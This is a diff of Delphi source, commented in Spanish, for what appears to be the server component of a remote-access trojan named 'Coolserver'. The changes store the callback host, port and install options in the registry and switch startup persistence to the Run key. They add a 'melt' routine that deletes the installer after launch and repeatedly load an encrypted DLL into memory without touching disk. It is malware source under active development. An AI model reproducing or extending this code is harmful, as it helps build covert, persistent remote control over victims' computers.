@@ -19,17 +19,18 @@ uses                 {Sí que se puede injectar si se compila desde el código fue
   Windows,
   BTMemoryModule, //Para cargar una DLL en memoria sin escribir en disco
   SettingsDef,
-  winsock,
+  WinSock,
   shellapi,
   UnitInstalacion,
   vars,
+  Minireg,
   SHFolder;
 
 
 var
   dllc:            string;
   Close:           boolean;
-
+  i: integer;
 function LastPos(Needle: char; Haystack: string): integer;
 begin
   for Result := Length(Haystack) downto 1 do
@@ -68,7 +69,7 @@ begin
 end;
 
 
-function GetSpecialFolderPath(folder : integer) : string;
+function GetSpecialFolderPath(folder : integer) : string;    //Para el futuro %userdir%
 const
   SHGFP_TYPE_CURRENT = 0;
 var
@@ -81,7 +82,7 @@ begin
 end;
 
 
-Function GetCurrentDirectory: String;
+Function GetCurrentDirectory: String;     //conseguir dir actual sin sysutils
 Var
   a:string;
 Begin
@@ -176,7 +177,7 @@ begin
   content := cifrar(content);
   p := @content[1];
   if(length(content) > 0) then
-  BTMemoryLoadLibary(p, m_DllDataSize);
+    BTMemoryLoadLibary(p, m_DllDataSize);   //injectamos DLL
 end;
 
 
@@ -336,16 +337,16 @@ end;
 procedure loadsettings();
 var
     ConfigLeida: PSettings;
+    ConfigRegistro: string;
 begin
-  dllc := GetCurrentDirectory+'\plugi.dat';
-  if ReadSettings(ConfigLeida) = True then
+     //leerlo de la config?
+  if ReadSettings(ConfigLeida) = True then   //Como no estoy instalado o no estoy injectado puedo leer la configuracion como siempre
     begin
       Configuracion.sHost   := ConfigLeida^.sHost;
       Configuracion.sPort   := ConfigLeida^.sPort;
       Configuracion.sID     := ConfigLeida^.sID;
       //Nombre que identifica al servidor. LeerID() intenta leer si hay algo escrito en el registro y si no devuelve este valor, configuracion.sID;
       Configuracion.iPort   := ConfigLeida^.iPort;
-      Configuracion.iTimeToNotify := ConfigLeida^.iTimeToNotify;
       //En segundos cada cuanto intenta conectarse el server al cliente
       Configuracion.bCopiarArchivo := ConfigLeida^.bCopiarArchivo; //Me copio o no?
       Configuracion.sFileNameToCopy := ConfigLeida^.sFileNameToCopy;
@@ -355,17 +356,55 @@ begin
       Configuracion.bCopiarConFechaAnterior := ConfigLeida^.bCopiarConFechaAnterior;
       //Modificar la fecha del servidor?
       Configuracion.bMelt   := ConfigLeida^.bMelt; //Melt?
-      Configuracion.bArranquePolicies := ConfigLeida^.bArranquePolicies;
+      Configuracion.bArranqueRun := ConfigLeida^.bArranqueRun;
       //Me agrego a Policies?
-      Configuracion.sPoliciesRegKeyName := ConfigLeida^.sPoliciesRegKeyName;
+      Configuracion.sRunRegKeyName := ConfigLeida^.sRunRegKeyName;
       //Nombre con el que me agrego a policies
       //MessageBox(0, PChar('Leí la configuración bien. El puerto es: '+Configuracion.sPort), 'Leí', 0); //Para pruebas!!!
+      dllc := GetCurrentDirectory+'\'+ConfigLeida^.sPluginName;
+
+      //Preparamos la configuracion para agregarla al registro
+
+      ConfigRegistro := ConfigRegistro + ConfigLeida^.sHost+'|';
+      ConfigRegistro := ConfigRegistro + ConfigLeida^.sPort+'|';
+      ConfigRegistro := ConfigRegistro + ConfigLeida^.sID+'|';
+      ConfigRegistro := ConfigRegistro + inttostr(ConfigLeida^.iPort)+'|';
+      if(ConfigLeida^.bCopiarArchivo) then
+        ConfigRegistro := ConfigRegistro + 'true|'
+      else
+        ConfigRegistro := ConfigRegistro + 'false|';
+
+      ConfigRegistro := ConfigRegistro + ConfigLeida^.sFileNameToCopy+'|';
+      ConfigRegistro := ConfigRegistro + ConfigLeida^.sCopyTo+'|';
+
+      if(ConfigLeida^.bCopiarConFechaAnterior) then
+        ConfigRegistro := ConfigRegistro + 'true|'
+      else
+         ConfigRegistro := ConfigRegistro + 'false|';
+
+      if(ConfigLeida^.bMelt) then
+        ConfigRegistro := ConfigRegistro + 'true|'
+      else
+        ConfigRegistro := ConfigRegistro + 'false|';
+
+      if(ConfigLeida^.bArranqueRun) then
+        ConfigRegistro := ConfigRegistro + 'true|'
+      else
+        ConfigRegistro := ConfigRegistro + 'false|';
+
+
+      ConfigRegistro := ConfigRegistro + ConfigLeida^.sRunRegKeyName+'|';
+
+
+      RegSetString(HKEY_CURRENT_USER,'Software\C00l'{Quizas mejor un valor aleatorio?}, ConfigRegistro);
+     //hay que guardar la configuración al registro para que la lea el servidor
     end
     else
     begin
-    //halt;  //Si no pude leer la configuracion...detener la ejecución
-      //Para desarrollo es mejor que cargue una configuración por defecto
-      Configuracion.sHost   := '127.0.0.1';
+    //halt;  //Si he llegado a este punto es que o no he podido leer la configuración o que estoy injectado en un proceso
+             //Así que tengo que leer la configuracion del registro
+      exitprocess(0);
+      {Configuracion.sHost   := '127.0.0.1';
       Configuracion.sPort   := '7000';
       Configuracion.sID     := 'Coolserver';
       Configuracion.iPort   := 7000;
@@ -377,10 +416,11 @@ begin
       Configuracion.sCopyTo := '%windir%\lol\'; //la carpeta donde debe copiarse
       Configuracion.bCopiarConFechaAnterior := False; //Modificar la fecha del servidor?
       Configuracion.bMelt   := False; //Melt?
-      Configuracion.bArranquePolicies := False; //Me agrego a Policies?
-      Configuracion.sPoliciesRegKeyName := 'Coolserver';
+      Configuracion.bArranqueRun := False; //Me agrego a Policies?
+      Configuracion.sRunRegKeyName := 'Coolserver';
       //Nombre con el que me agrego a policies
       //MessageBox(0, PChar('Leí la configuración bien. El puerto es: '+Configuracion.sPort), 'Leí', 0); //Para pruebas!!!
+      dllc := GetCurrentDirectory+'\plugi.dat';  }
     end;
 end;
 
@@ -392,9 +432,9 @@ begin
  while true do
  begin
     iniciar();
-    sleep(3000);
+    sleep(10000); //cada 10 segundos
     while fileExists(dllc) do
-    loaddll(dllc);
+      loaddll(dllc);
   end;
 
   WSACleanup();
@@ -403,6 +443,18 @@ end;
 
 
 begin
+   if ParamStr(1) = '\melt' then
+    begin
+      //borro el archivo de instalación, reintento 5 veces por si las moscas :)
+      for i := 1 to 5 do
+      begin
+        BorrarArchivo(ParamStr(2));
+        if not FileExists(ParamStr(2)) then
+          break; //si yalo borrò entonces se sale del for
+        Sleep(10);
+      end;
+      //Otra opción: while not BorrarArchivo(ParamStr(2)) do Sleep(10);
+    end; //Termina el Melt
   loadsettings();  //Leemos la configuración
   Instalar();
   main();
